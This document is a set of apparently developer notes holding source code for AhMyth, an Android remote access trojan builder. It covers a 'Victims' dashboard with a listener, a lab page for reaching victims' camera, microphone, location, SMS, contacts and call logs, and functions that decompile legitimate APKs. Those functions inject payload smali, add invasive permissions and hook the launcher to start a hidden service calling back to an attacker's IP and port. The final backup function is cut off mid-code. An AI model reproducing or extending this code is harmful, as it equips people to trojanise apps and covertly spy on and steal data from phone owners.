## Updated `index.html` file with correct log screen height
```html
<!DOCTYPE html>
<html ng-app="myapp">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no" />

    <title>AhMyth</title>

    <!-- Insert this line above script imports  -->
    <script>
        if (typeof module === 'object') {
            window.module = module;
            module = undefined;
        }
    </script>


    <script type="text/javascript" src="assets/js/lib/jquery-3.1.1.min.js"></script>
    <script type="text/javascript" src="../node_modules/fomantic-ui/dist/semantic.min.js"></script>
    <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
    <script type="text/javascript" src="assets/js/controllers/AppCtrl.js"></script>
    <!-- Insert this line after script imports -->
    <script>
        if (window.module) module = window.module;
    </script>

    <link rel="stylesheet" href="assets/css/mystyle.css">
    <link rel="stylesheet" href="../node_modules/fomantic-ui/dist/semantic.min.css" />
    <style>
        #log {
            height: 198px; /* Adjust the height value as per your preference */
            overflow: scroll;
        }
    </style>

</head>

<body ng-controller="AppCtrl" class="draggable">

    <div class="ui top attached tabular menu">
        <a class="item active notDraggable" data-tab="first"><i class="large eye icon"></i>Victims</a>
        <a class="item notDraggable" data-tab="second"><i class="large green android icon"></i>APK Builder</a>
        <a class="item notDraggable" data-tab="third"><i class="large blue cloud icon"></i>Payload Url Masker</a>
        <div class="ui right mini text menu notDraggable">
            <button class=" ui circular orange button" ng-click="minimize()" style="font-size: 6px;height: 17px"></button>
            <button class="ui circular green button" ng-click="maximize()" style="font-size: 6px;height: 17px"></button>
            <button class="ui circular red button" ng-click="close()" style="font-size: 6px;height: 17px"></button>
        </div>
    </div>

    <div class="ui bottom attached tab segment active h60 notDraggable" data-tab="first">
        <div class="ui grid h100">
            <div class="row h30">
                <div class="column">
                    <div class="ui horizontal segments">
                        <div class="ui segment">
                            <h2 class="ui left floated header">
                                <img class="ui image" src="assets/img/VictimsLab.png">
                                <div class="content">
                                    VICTIMS LAB
                                </div>
                            </h2>
                        </div>
                        <div class="ui center aligned segment">
                            <div style="line-height: 70px">
                                <div class="ui right floated labeled input">
                                    <div class="ui label">
                                        Port
                                    </div>
                                    <input type="text" ng-model="port" placeholder="Default is 42474">
                                </div>
                                <button ng-click="isListen=true;Listen(port);" class="ui labeled icon black button"><i class="terminal icon"></i>Listen</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row h75" style="overflow: scroll;">
                <div class="column">
                    <table class="ui table single line selectable">
                        <thead>
                            <tr>
                                <th></th>
                                <th>Country</th>
                                <th>Manuf.</th>
                                <th>Model</th>
                                <th>Release</th>
                                <th>IP</th>
                                <th>Port</th>
                                <th></th>
                            </tr>
                        </thead>

                        <tbody>

                            <tr ng-repeat="(key, victim) in victims">
                                <td><a class="ui black ribbon label" ng-click="openLab(key)">Open The Lab</a></td>
                                <td ng-if="victim.country != null"><i class="{{victim.country}} flag"></i></td>
                                <td ng-if="victim.country == null"><i class="help circle icon"></i></td>
                                <td ng-bind="victim.manf"></td>
                                <td ng-bind="victim.model"></td>
                                <td ng-bind="victim.release"></td>
                                <td ng-bind="victim.ip"></td>
                                <td ng-bind="victim.port"></td>
                                <td></td>
                            </tr>

                        </tbody>
                    </table>
                </div>
            </div>

        </div>
    </div>

    <div class="ui bottom attached tab segment h60 notDraggable" data-tab="second">
        <div ng-include="'views/build.html'" class="full"></div>
    </div>

    <div class="ui bottom attached tab segment h60 notDraggable" data-tab="third">
        <div ng-include="'views/unavailable.html'" class="full"></div>
    </div>

    <div class="ui bottom attached black message notDraggable" id="log">
        <div ng-repeat="log in logs" class="log">
            <div class="w30" style="display: inline-block" ng-bind="log.date"></div>
            <div class="w65" style="display: inline-block" ng-style="{'color':log.color}" ng-bind="log.msg"></div>
        </div>
    </div>

</body>

</html>
```
## Updated `lab.html` file with correct log screen height
```html
<!DOCTYPE html>
<html ng-app="myappy">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no" />
    <title>Lab</title>
    <script>
        if (typeof module === 'object') {
            window.module = module;
            module = undefined;
        }
    </script>


    <script type="text/javascript" src="assets/js/lib/jquery-3.1.1.min.js"></script>
    <script type="text/javascript" src="../node_modules/fomantic-ui/dist/semantic.min.js"></script>
    <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
    <script type="text/javascript" src="../node_modules/angular-route/angular-route.min.js"></script>
    <script type='text/javascript' src='assets/js/lib/ng-infinite-scroll.min.js'></script>
    <script type="text/javascript" src="assets/js/lib/leaflet.js"></script>
    <script type="text/javascript" src="assets/js/controllers/LabCtrl.js"></script>


    <!-- Insert this line after script imports -->
    <script>
        if (window.module) module = window.module;
    </script>

    <link rel="stylesheet" href="assets/css/mystyle.css">
    <link rel="stylesheet" href="../node_modules/fomantic-ui/dist/semantic.min.css" />
    <link rel="stylesheet" href="assets/css/leaflet.css" />
    <style>
        #logy {
            height: 158px; /* Adjust the height value as per your preference */
            overflow: scroll;
        }
    </style>

</head>

<body ng-controller="LabCtrl" class="draggable">

    <div class="ui grid h80">
        <div class="row h10">
            <div class="sixteen wide column">
                <div class="ui inverted mini text labeled icon menu">
                    <a class="item">
                        <img src="assets/img/icon.png" /> </a>
                    <div class="right  menu notDraggable">
                        <button class="ui circular red button" ng-click="close()" style="font-size: 6px;height: 17px"></button>
                    </div>
                </div>
            </div>
        </div>

        <div class="row h15 notDraggable">
            <div class="sixteen wide column">
                <div class="ui mini borderless labeled icon fluid seven item menu">
                    <a class="item" ng-click="goToPage('camera')">
                        <i class="red photo icon"></i> Camera
                    </a>
                    <a class="item" ng-click="goToPage('fileManager')">
                        <i class=" teal folder icon "></i> File Manager
                    </a>
                    <a class="item" ng-click="goToPage('mic')">
                        <i class="blue unmute icon "></i> Mic
                    </a>
                    <a class="item " ng-click="goToPage('location')">
                        <i class="violet marker icon "></i> Location
                    </a>
                    <a class="item " ng-click="goToPage('contacts')">
                        <i class="purple users icon "></i> contacts
                    </a>
                    <a class="item " ng-click="goToPage('smsManager')">
                        <i class="grey talk outline icon "></i> SMS
                    </a>
                    <a class="item " ng-click="goToPage('callsLogs')">
                        <i class="black call icon "></i> Calls Logs
                    </a>
                </div>

            </div>
        </div>




        <div class="row centered h75 notDraggable ">
            <div class="sixteen wide column">
                <div class="ui segment full">
                    <div ng-view class="full">
                    </div>
                </div>
            </div>
        </div>


    </div>
    <div class="ui bottom attached black message notDraggable " id="logy" style="overflow: scroll;">
        <div ng-repeat="log in logs " class="log ">
            <div class="w30 " style="display: inline-block " ng-bind="log.date "></div>
            <div class="w65 " style="display: inline-block " ng-style="{ 'color':log.color} " ng-bind="log.msg "></div>
        </div>
    </div>
</body>

</html>
```
## Updated 'Constants.js' File
```js
var path = require("path");


//---------------------App Controller Vars----------------------------------
exports.apkName = 'Ahmyth.apk';
exports.apkSourceName = 'Ahmyth';
exports.signedApkName = 'Ahmyth-aligned-debugSigned.apk';
exports.ahmythApkFolderPath = path.join(__dirname, '..', '..', 'Factory/Ahmyth').replace("app.asar", "app.asar.unpacked");
exports.vaultFolderPath = path.join(__dirname, '..', '..', 'Factory/Vault').replace("app.asar", "app.asar.unpacked");
exports.apktoolJar = path.join(__dirname, '..', '..', 'Factory/apktool.jar').replace("app.asar", "app.asar.unpacked");
exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replace("app.asar", "app.asar.unpacked");
exports.maskUrlPython = path.join(__dirname, '..', '..', 'Factory/maskUrl.py').replace("app.asar", "app.asar.unpacked");
exports.dataDir = 'AhMyth'
exports.downloadPath = 'Downloads';
exports.outputApkPath = 'Output';
exports.outputLogsPath = 'Logs';
exports.logColors = { RED: "red",  GREEN: "lime", YELLOW: "yellow", DEFAULT: "#82eefd" };
exports.logStatus = { SUCCESS: 1, FAIL: 0, INFO: 2 };
exports.defaultPort = 42474;
exports.IOSocketPath = 'smali' + path.sep + 'ahmyth' + path.sep + 'mine' + path.sep + 'king' + path.sep + 'ahmyth' + path.sep + 'e.smali';
exports.ahmythService = '<service android:enabled="true" android:exported="false" android:name="ahmyth.mine.king.ahmyth.MainService"/>';
exports.ahmythReciver = '<receiver android:enabled="true" android:exported="true" android:name="ahmyth.mine.king.ahmyth.MyReceiver">' +
    '<intent-filter>' +
    '<action android:name="android.intent.action.BOOT_COMPLETED"/>' +
    '</intent-filter>' +
    '</receiver>';
exports.serviceSrc = 'invoke-static {}, Lahmyth/mine/king/ahmyth/MainService'
exports.serviceStart = ';->start()V \n\n' +
'    return-void';
exports.hookPoint = 'return-void';
exports.permissions = [
    '<uses-permission android:name="android.permission.WAKE_LOCK"/>',
    '<uses-permission android:name="android.permission.CAMERA"/>',
    '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>',
    '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
    '<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>',
    '<uses-permission android:name="android.permission.WRITE_SETTINGS"/>',
    '<uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>',
    '<uses-permission android:name="android.permission.INTERNET"/>',
    '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>',
    '<uses-permission android:name="android.permission.READ_SMS"/>',
    '<uses-permission android:name="android.permission.SEND_SMS"/>',
    '<uses-permission android:name="android.permission.RECEIVE_SMS"/>',
    '<uses-permission android:name="android.permission.WRITE_SMS"/>',
    '<uses-feature android:name="android.hardware.camera"/>',
    '<uses-feature android:name="android.hardware.camera.autofocus"/>',
    '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>',
    '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
    '<uses-permission android:name="android.permission.READ_CALL_LOG"/>',
    '<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>',
    '<uses-permission android:name="android.permission.READ_CONTACTS"/>',
    '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
    '<uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>',
    '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>',
    '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>',
    '<uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>',
    '<uses-permission android:name="android.permission.INSTALL_PACKAGE"/>'
]



//---------------------Lab Controller Vars----------------------------------
exports.order = 'order';
exports.orders = {
    camera: 'x0000ca',
    fileManager: 'x0000fm',
    calls: 'x0000cl',
    sms: 'x0000sm',
    mic: 'x0000mc',
    location: 'x0000lm',
    contacts: 'x0000cn',

}
```
## new `CopyAhmythFilesAndGenerateApk` function
> contains new smali payload directory creator function
```js
$appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {

    delayedLog('[★] Copying AhMyth Payload Files to Original App...');
    delayedLog('[★] Reading the Original Decompiled APK...')
    fs.readdir(apkFolder, {
        withFileTypes: true
    }, (error, files) => {
        if (error) {
            delayedLog('[x] Reading the Decompiled APK Failed!', CONSTANTS.logStatus.FAIL)
            return;
        }
        
        var ignoreDirs = ['original',
            'res',
            'build',
            'kotlin',
            'lib',
            'assets',
            'META-INF',
            'unknown'];
        var smaliList = files
        .filter((item) => item.isDirectory() &&
            !(ignoreDirs.includes(item.name)))
        .map((item) => item.name);
        var collator = new Intl.Collator([], {
            numeric: true
        });
        smaliList.sort((a, b) => collator.compare(a, b));
        var lastSmali = smaliList[smaliList.length -1];
        if (lastSmali == "smali") {
        delayedLog('[★] Creating the new Smali Payload Directory...')

            fs.mkdir(apkFolder + "/smali_classes2", {
                recursive: true
            }, error => {
                if (error) {
                    delayedLog('[x] Unable to Create the Smali Payload Directory!', CONSTANTS.logStatus.FAIL);
                    return;
                };
                
                delayedLog('[★] Copying AhMyth Payload Files to Original App...');

                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"),
                    dir.join(apkFolder, "smali_classes2"), (error) => {
                        if (error) {
                            delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
                            WriteErrorLog(error, 'Copying.log');
                            delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                            delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }
                        
                        fs.rmdir(dir.join(apkFolder, 'smali_classes2', 'android'), {
                            recursive: true
                        });
                        fs.rmdir(dir.join(apkFolder, 'smali_classes2', 'androidx'), {
                            recursive: true
                        });

                        $appCtrl.GenerateApk(apkFolder);

                    });

            });

        } else {

            var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
            var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
            var newSmaliNumber = lastSmaliNumber+1;
            var payloadSmaliFolder = ('/smali_classes'+newSmaliNumber);
            delayedLog('[★] Creating the new Smali Payload Directory...')

            fs.mkdir(apkFolder + payloadSmaliFolder, {
                recursive: true
            }, error => {
                if (error) {
                    delayedLog('[x] Unable to Create the Smali Payload Directory!', CONSTANTS.logStatus.FAIL);
                    return;
                };

                delayedLog('[★] Copying AhMyth Payload Files to Original App...');

                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"),
                    dir.join(apkFolder, payloadSmaliFolder), (error) => {
                        if (error) {
                            delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
                            WriteErrorLog(error, 'Copying.log');
                            delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                            delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }
                        
                        fs.rmdir(dir.join(apkFolder, payloadSmaliFolder, 'android'), {
                            recursive: true
                        });
                        fs.rmdir(dir.join(apkFolder, payloadSmaliFolder, 'androidx'), {
                            recursive: true
                        });

                        $appCtrl.GenerateApk(apkFolder);

                    });

            });

        };

    });

};
```

## Updated `copyPermissions` function
```js
$appCtrl.copyPermissions = (manifest) => {
    var firstPart = manifest.substring(0, manifest.indexOf("<application"));
    var lastPart = manifest.substring(manifest.indexOf("<application"));
    
    /* existing checkbox code */
    
    for (var i = 0; i < permArray.length; i++) {
        var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);
        permissionName = permissionName.substring(0, permissionName.indexOf('"'));
        if (firstPart.indexOf(permissionName) == -1) {
            // Check if this is the first permission being added
            if (firstPart.indexOf('uses-permission') == -1) {
                firstPart = firstPart + "\n" + permArray[i];
            } else {
                // Add the permission above the first existing permission
                var index = firstPart.indexOf('<uses-permission');
                firstPart = firstPart.slice(0, index) + permArray[i] + "\n" + firstPart.slice(index);
            }
        }
    }

    return (firstPart + lastPart);
};
```

## Updated `BindOnLauncher` function
```js
$appCtrl.BindOnLauncher = (apkFolder) => {
    delayedLog('[★] Reading the Android Manifest File...\n');
    fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
        if (error) {
            delayedLog('[x] Reading the Android Manifest file Failed!\n');
            return;
        }

        delayedLog('[★] Modifying the Android Manifest File...\n');
        const ahmythService = CONSTANTS.ahmythService;
        const permManifest = $appCtrl.copyPermissions(data);
        const newManifest = permManifest.substring(0, permManifest.indexOf('</application>')) + ahmythService
        + permManifest.substring(permManifest.indexOf('</application>'));
        fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), newManifest, 'utf8', (error) => {
            if (error) {
                delayedLog('[x] Modifying the Android Manifest Failed!\n', error);
                return;
            }

            xml2js.parseString(data, (err, result) => {
                if (err) {
                    delayedLog('[x] ' + err);
                    return;
                }

                delayedLog('[★] Searching for a Hookable Main Class in the Android Manifest...\n')
                const launcherActivity = GetLauncherActivity(result, apkFolder);
                if (launcherActivity === -1) {
                    delayedLog('[x] Cannot Find a Suitable Class for Hooking in the Manifest!');
                    delayedLog('[x] Please use Another APK as a Template!.\n');
                    return;
                }

                delayedLog('[★] Locating the Hookable Main Class File...\n');
                const launcherPath = GetLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
                    if (err) {
                        delayedLog('[x] Unable to Locate the Hookable Main Class File!');
                        delayedLog('[x] Please Use the "On Boot" Method!\n');
                        return;
                    } else {
                        delayedLog('[¡] Hookable Main Class File Found: ' + launcherPath + '\n');
                    }


                    delayedLog('[★] Reading the Hookable Main Class File...\n');
                    fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Unable to Read the Hookable Main Class File!\n');
                            return;
                        }

                        const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
                        var hook = CONSTANTS.hookPoint;


                        delayedLog('[★] Hooking the Class File...\n');

                        var output = data.replace(hook, startService);
                        fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                            if (error) {
                                delayedLog('[x] Modifying the Hookable Main Class File Failed!\n', CONSTANTS.logStatus.FAIL);
                                return;
                            }


                            delayedLog('[★] Determining Target SDK Version...\n');
                            fs.readFile(dir.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                                if (error) {

                                    delayedLog('[x] Reading the Manifest Target SDK Failed.');

                                    return;
                                }


                                delayedLog('[★] Modifying the Target SDK Version...\n');


                                var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                                var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                                var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                                var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/

                                var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"')
                                .replace(compSdkVerNameRegex, "$111" + '"')
                                .replace(platVerCoRegex, "$122" + '"')
                                .replace(platVerNameRegex, "$111" + '"');

                                fs.writeFile(dir.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                    if (error) {

                                        delayedLog('[x] Modifying Manifest Target SDK Failed!\n', CONSTANTS.logStatus.FAIL);

                                        return;
                                    }

                                    fs.readFile(dir.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                        if (error) {

                                            delayedLog("[x] Reading the 'apktool.yml' Target SDK Failed!\n");

                                            return;
                                        }

                                        var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                        var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;

                                        var repYmlSdk = data.replace(minSdkRegex, "$119'")
                                        .replace(tarSdkRegex, "$122'");

                                        fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                            if (error) {

                                                delayedLog("[x] Modifying the 'apktool.yml' Target SDK Failed!\n");

                                                return;
                                            }
                                            $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);
                                        });
                                    });
                                });
                            });

                        });

                    });

                });

            });

        });
    });

};
```

## Updated `Build` function
```js
  $appCtrl.Build = (ip, port) => {
    if (!ip) {
      $appCtrl.Log('[x] ' + 'IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
      return;
    }
    if (!port) {
      port = CONSTANTS.defaultPort;
    }
    if (port > 65535 || port <= 1024) {
      $appCtrl.Log('[x] ' + 'Choose ports from range (1024 - 65535)', CONSTANTS.logStatus.FAIL);
      return;
    }


    // open ahmyth source file and modifiy the ip and port to the users' ones
    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
    delayedLog('[★] ' + 'Reading (IP:PORT) file from ' + CONSTANTS.apkSourceName + '...');

    fs.readFile(ipPortFile, 'utf8', (error, data) => {
      if (error) {
        $appCtrl.Log('[x] ' + 'Reading (ip:port) file Failed', CONSTANTS.logStatus.FAIL);
        WriteErrorLog(error, 'IP-PORT.log')
        $appCtrl.Log('[¡] ' + 'Error written to "IP-PORT.log" on...', CONSTANTS.logStatus.INFO)
        $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
        return;
      }

      delayedLog('[★] ' + 'Adding source ip:port to ' + CONSTANTS.apkSourceName + '...');

      // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
      var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali")
      delayedLog('[★] ' + 'Adding source ip:port to ' + ipPortFilePath + '...');

      var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
      fs.writeFile(ipPortFile, result, 'utf8', (error) => {
        if (error) {
          $appCtrl.Log('[x] ' + 'Adding source ip:port Failed', CONSTANTS.logStatus.FAIL);
          WriteErrorLog(error, 'IP-PORT.log')
          $appCtrl.Log('[¡] ' + 'Error written to "IP-PORT.log" on...', CONSTANTS.logStatus.INFO)
          $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
          return;
        }

        // check if bind apk is enabled
        if (!$appCtrl.bindApk.enable) {
          $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
        } else {
          // generate a solid ahmyth apk
          var filePath = $appCtrl.filePath;
          if (filePath == null) {
            $appCtrl.Log('[x] ' + 'Browse for the Original APK you Want to Bind With', CONSTANTS.logStatus.FAIL);
            return;
          } else if (!filePath.includes(".apk")) {
            $appCtrl.Log('[x] ' + 'Sorry! This is not an APK file', CONSTANTS.logStatus.FAIL);
            return;
          }


          var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
          delayedLog('[★] ' + 'Decompiling ' + '"' + filePath.replace(/\\/g, "/").split("/").pop() + '"' + "...");

          var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
            (error, stdout, stderr) => {
              if (error !== null) {
                $appCtrl.Log('[x] ' + 'Decompiling Failed!', CONSTANTS.logStatus.FAIL);
                WriteErrorLog(error, 'Decompiling.log')
                $appCtrl.Log('[¡] ' + 'Decompiling Error written to "Decompiling.log" on...', CONSTANTS.logStatus.INFO)
                $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
                return;
              }

              if ($appCtrl.bindApk.method == 'BOOT')
                $appCtrl.BindOnBoot(apkFolder);

              else if ($appCtrl.bindApk.method == 'ACTIVITY')
                $appCtrl.BindOnLauncher(apkFolder);


            });
        }
      });
    });
  }










});
```
## New Functions
```js
function delayedLog(msg, status) {
    let count = delayedLog.count = (delayedLog.count || 0) + 1;
    setTimeout(() => {
        $appCtrl.Log(msg, status);
    }, count * 0500);
};

function WriteErrorLog(errorMessage, errorType) {
    // Check if the log directory exists, if not then create it
    if (!fs.existsSync(logPath)) {
        fs.mkdirSync(logPath);
    }

    // Write the error to the appropriate log file based on the error type
    switch (errorType) {
        case 'Building':
            fs.appendFileSync(dir.join(logPath, 'Building.log'), errorMessage + '\n');
            break;
            
        case 'Signing':
            fs.appendFileSync(dir.join(logPath, 'Signing.log'), errorMessage + '\n');
            break;
            
        case 'Decompiling':
            fs.appendFileSync(dir.join(logPath, 'Decompiling.log'), errorMessage + '\n');
            break;
            
        case 'IP:PORT':
            fs.appendFileSync(dir.join(logPath, 'IP-PORT.log'), errorMessage + '\n');
            break;
            
        case 'Copying':
            fs.appendFileSync(dir.join(logPath, 'Copying.log'), errorMessage + '\n');
            break;
            
        default:
            // If the error type is not recognized, write it to a generic error log file
            fs.appendFileSync(dir.join(logPath, 'Error.log'), errorMessage + '\n');
            break;
    }
}

function GetLauncherActivity(manifest) {

    const application = manifest['manifest']['application'][0];

    let mainApplicationClassName = application && application['$'] && application['$']['android:name'];

    if (mainApplicationClassName && !mainApplicationClassName.startsWith('android.app')) {
        mainApplicationClassName = mainApplicationClassName.split('.').pop();
        if (mainApplicationClassName.startsWith('.')) {
            mainApplicationClassName = mainApplicationClassName.slice(1);
        }
        delayedLog('[¡] Scoped the Main App Class for Hooking...', CONSTANTS.logStatus.INFO);
        return mainApplicationClassName + '.smali';
    }

    const activity = application && application['activity'] && application['activity'].find((activity) => {
        const intentFilter = activity['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activity) {
        let mainActivityClassName = activity['$'] && activity['$']['android:name'];
        if (!mainActivityClassName.startsWith('android.app')) {
            mainActivityClassName = mainActivityClassName.split('.').pop();
            if (mainActivityClassName.startsWith('.')) {
                mainActivityClassName = mainActivityClassName.slice(1);
            }
            delayedLog('[¡] Scoped the Main Launcher Activity Class for Hooking...', CONSTANTS.logStatus.INFO);
            return mainActivityClassName + '.smali';
        }
    }

    const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {
        const intentFilter = activityAlias['intent-filter'];
        if (intentFilter) {
            return intentFilter.some((filter) =>
                filter['action'] &&
                filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&
                filter['category'] &&
                filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')
            );
        }
        return false;
    });

    if (activityAlias) {
        let targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];
        targetActivityName = targetActivityName.split('.').pop();
        if (targetActivityName.startsWith('.')) {
            targetActivityName = targetActivityName.slice(1);
        }
        delayedLog('[¡] Scoped the Main Launcher Activity Class in an Alias for Hooking...', CONSTANTS.logStatus.INFO);
        return targetActivityName + '.smali';
    }

    return -1;

}

function GetLauncherPath(launcherActivity, apkFolder, callback) {
    let found = false;
    let launcherPath = null;
    readdirp(apkFolder, {
        fileFilter: launcherActivity, alwaysStat: true
    })
    .on('data', (entry) => {
        found = true;
        var {
            path, stats: {}
        } = entry;
        var output = `${JSON.stringify(path)}`;
        launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
    })
    .on('end',
        () => {
            if (!found) {
                callback('[x] Unable to Locate the Hookable Main Class File!');
                callback('[x] Please Use the "On Boot" Method!\n');
            } else {
                callback(null, launcherPath);
            }
        })
    .on('error',
        (err) => {
            callback(err);
        });
}
```
## Backup Cross Platform Bind On Launch function
Stored just in case of problems with the original Cross platform bind on launch function
```js
const fs = require('fs-extra');
const xml2js = require('xml2js');
const path = require('path');
const exec = require('child_process').exec;
var CONSTANTS = require('/data/data/com.termux/files/home/test/Constants.js');
const apkFolder = '/data/data/com.termux/files/home/flappy';

var copyPermissions = (manifest) => {
    // $appCtrl.copyPermissions = (manifest) => {
    var firstPart = manifest.substring(0, manifest.indexOf("<application"));
    var lastPart = manifest.substring(manifest.indexOf("<application"));

    var permArray = CONSTANTS.permissions;
    for (var i = 0; i < permArray.length; i++) {
        var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);
        permissionName = permissionName.substring(0, permissionName.indexOf('"'));
        if (firstPart.indexOf(permissionName) == -1) {
            // Check if this is the first permission being added
            if (firstPart.indexOf('uses-permission') == -1) {
                firstPart = firstPart + "\n" + permArray[i];
            } else {
                // Add the permission above the first existing permission
                var index = firstPart.indexOf('<uses-permission');
                firstPart = firstPart.slice(0, index) + permArray[i] + "\n" + firstPart.slice(index);
            }
        }
    }

    return (firstPart + lastPart);
};

//$appCtrl.BindOnLauncher = (apkFolder) => {

    console.log('[★] Finding Launcher Activity From AndroidManifest.xml...');;
    fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
        if (error) {
            console.log('[★] Reading AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);;
            return;
        }

        xml2js.parseString(data, (err, result) => {
            if (err) {
                console.error(err);
                return;
            }

            var launcherActivity = GetLauncherActivity(result, apkFolder);
            if (launcherActivity == -1) {
                console.log("[★] Cannot Find the Launcher Activity in the Manifest!", CONSTANTS.logStatus.FAIL);
                console.log("[★] Please use Another APK as a Template!.", CONSTANTS.logStatus.INFO);;
                return;
            }

            var ahmythService = CONSTANTS.ahmythService;
            console.log('[★] Modifying AndroidManifest.xml...');;
            var permManifest = copyPermissions(data); //$appCtrl.copyPermissions(data);
            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                if (error) {
                    console.log('[★] Modifying AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);;
                    return;
                }

                if (process.platform === 'win32') {
                    console.log("[★] Locating Launcher Activity...");
                    exec('set-location ' + '"' + apkFolder + '"' + ';' + ' gci -path ' + '"'
                        + apkFolder + '"' + ' -recurse -filter ' + '"' + launcherActivity + '"'
                        + ' -file | resolve-path -relative', {
                        'shell': 'powershell.exe'
                    }, (error, stdout, stderr) => {
                        var launcherPath = stdout.substring(stdout.indexOf(".\\") + 2).trim("\n");
                        if (error !== null) {
                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                            return;
                        } else if (!launcherPath) {
                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                            return;
                        } else {
                            console.log("[★] Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);;
                        }

                        console.log("[★] Reading Launcher Activity...");
                        fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                            if (error) {
                                console.log('[★] Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                                console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                                return;
                            }

                            var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;

                            var hook = CONSTANTS.hookPoint;
